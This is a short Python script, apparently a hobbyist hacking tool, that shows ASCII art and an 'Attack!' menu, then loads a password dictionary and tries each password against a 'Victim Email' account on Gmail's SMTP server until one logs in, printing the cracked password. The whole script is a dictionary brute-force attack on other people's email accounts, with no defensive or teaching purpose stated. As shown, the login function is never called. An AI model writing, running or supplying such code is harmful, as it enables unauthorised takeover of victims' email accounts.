import smtplib
import colorama
from os import system
from colorama import Fore, Back, Style
import getpass

def main():
        
    print(Fore.CYAN + "                           _")
    print("                        _ooOoo_")
    print("                       o8888888o")
    print("                       88\" . \"88")       
    print(Fore.RED + "                       (| -_- |)")    
    print(Fore.CYAN +"                       O\  =  /O")
    print(Fore.RED +"                    ____/`---'\____   --Buddha's in the system")      
    print(Fore.CYAN +"                  .'  \\|     |//  `.")
    print("                 /  \\|||  :  |||//  \\")
    print("                /  _||||| -:- |||||_  \\")
    print("                |   | \\\  -  /'| |   |")
    print(Fore.RED +"                | \_|  `\`---'//  |_/ |")
    print(Fore.CYAN +"                \  .-\__ `-. -'__/-.  /")
    print("              ___`. .'  /--.--\  `. .'___")
    print("           .\"\" '<  `.___\_<|>_/___.' _> \"" + Fore.RESET)
    print(Fore.CYAN + "          | | :  `- \`. ;`. _/; .'/ /  .' ; |")  
    print("          \  \ `-.   \_\_`. _.'_/_/  -' _.' /")
    print("===========`-.`___`-.__\ \___  /__.-'_.'_.-'================")
    print("                        `=--=-'")

main()

print ("1: Attack!")
print ("2: Exit")
option = input('==>')
if option == '1':
    direction_path = input("direction of dictionary: ")
else:
    system('clear')
    exit()
password_txt = open(direction_path,'r')
password_lines = password_txt.readlines()

def login():
    i = 0
    user_name = input('Victim Email :):')
    server = smtplib.SMTP_SSL('smtp.gmail.com',465)
    server.ehlo()
    for password in password_lines:
        i = i + 1
        print(i, '/', len(password_lines))
        try:
            server.login(user_name, password)
            system('clear')
            main()
            print("Ataque completado," + password + user_name)
            break
        except smtplib.SMTPAuthenticationError:
            pass
    else:
        print("Contraseña no encontrada en el diccionario")
